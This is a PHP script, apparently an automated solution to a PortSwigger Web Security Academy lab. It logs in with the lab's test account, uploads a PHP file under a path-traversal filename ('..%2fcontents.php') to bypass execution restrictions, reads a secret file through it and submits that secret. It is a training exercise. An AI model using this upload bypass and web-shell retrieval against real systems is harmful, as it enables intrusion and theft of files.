<?php

/* This lab contains a vulnerable image upload function. The server is configured to prevent execution of user-supplied files, but this restriction can be bypassed by exploiting a secondary vulnerability.

To solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file /home/carlos/secret. Submit this secret using the button provided in the lab banner.

You can log in to your own account using the following credentials: wiener:peter

Lab link: https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-path-traversal
*/

use GuzzleHttp\Client;

require_once('../vendor/autoload.php');

/*
Get csrf token from html responses to use for future requests

@param string $html_body  An html page response in text form
@return csrf token string
*/
function parse_csrf($html_body) {
    $re = '/type="hidden" name="csrf" value="([A-Za-z0-9]*)">/m';
    preg_match($re, $html_body, $matches) or die('csrf not found' . PHP_EOL);
    return $matches[1];
}

$lab_id = '0aca007d04fab5bc868e709200680006'; // !!!---Change based on lab id----!!!
$uri = 'https://' . $lab_id . '.web-security-academy.net';
$client = new Client([ 'base_uri' => $uri, 'cookies' => true ]); // Establish connection to base lab page, and maintain sessions for requests

//***Need to query the login page to get the csrf token to login */ 
$r1_data = ['endpoint' => '/login'];
$resp_1 = $client->get($r1_data['endpoint']);

//***Use the csrf token to login as the wiener user***//
$csrf_1 = parse_csrf($resp_1->getBody());
$r2_data = [
    'endpoint' => '/login',
    'params' => [
        'form_params' => [
            'csrf' => $csrf_1,
            'username' => 'wiener',
            'password' => 'peter',
        ]
    ]
];
$resp_2 = $client->post($r2_data['endpoint'], $r2_data['params']);

//***Extract 2nd csrf token for file upload sumission, then send our malicious file */
$csrf_2 =  parse_csrf($resp_2->getBody());
$r3_data = [
    'endpoint' => '/my-account/avatar',
    'params' => [
        'multipart' => [
            [
                'name'     => 'user',
                'contents' => 'wiener'
            ],
            [
                'name'     => 'avatar',
                'contents' => fopen('contents.php', 'r'),
                'filename' => '..%2fcontents.php', // Use url encoding to put the malicious file 1 directory below, bypassing execution protections
            ],
            [
                'name' => 'csrf',
                'contents' => $csrf_2
            ]
            ],
        'headers'  => ['Accept-Encoding' => 'gzip, deflate, br']
        ]
    ];
$resp_3 = $client->post($r3_data['endpoint'], $r3_data['params']);

//***Get the solution flag from the malicous php file we just uploaded */
$r4_data =  ['endpoint' => '/files/contents.php'];
$resp_4 = $client->get($r4_data['endpoint']);
$token = $resp_4->getBody();

//***Submit flag to complete the lab */
$r5_data = [ 
    'endpoint' => '/submitSolution',
    'params' => [
        'body' => 'answer=' . trim($token)
        ]
    ];

$resp_5 = $client->request('POST', $r5_data['endpoint'], $r5_data['params']);
echo $resp_5->getBody() . PHP_EOL . 'done', PHP_EOL;
?>